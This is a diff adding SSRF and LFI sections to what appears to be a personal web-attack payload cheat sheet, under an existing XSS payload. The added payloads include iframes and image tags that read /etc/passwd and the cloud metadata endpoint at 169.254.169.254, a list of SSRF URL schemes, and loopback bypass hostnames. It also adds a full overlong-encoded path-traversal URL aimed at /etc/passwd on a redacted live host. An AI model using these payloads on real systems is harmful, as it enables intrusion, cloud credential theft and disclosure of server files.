@@ -355,6 +355,30 @@ xss
 “><img src=x onerror=prompt(2);>
 ------------------
 
+SSRF
+
+upload 
+
+<img src=file:///usr/share/pixmaps/debian-logo.png"/>
+
+
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+
+
+https://example.com/viewimage/?url=file:///etc/passwd
+file:///, dict://, ftp://, gopher://
+
+“><iframe src=”file:///etc/passwd”/></iframe>
+
+
+ping SSRF
+http://127.0.0.1.nip.io
+ping 127.127.127.127.nip.io
+
+
+LFI 
+https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd
+
 
 
 
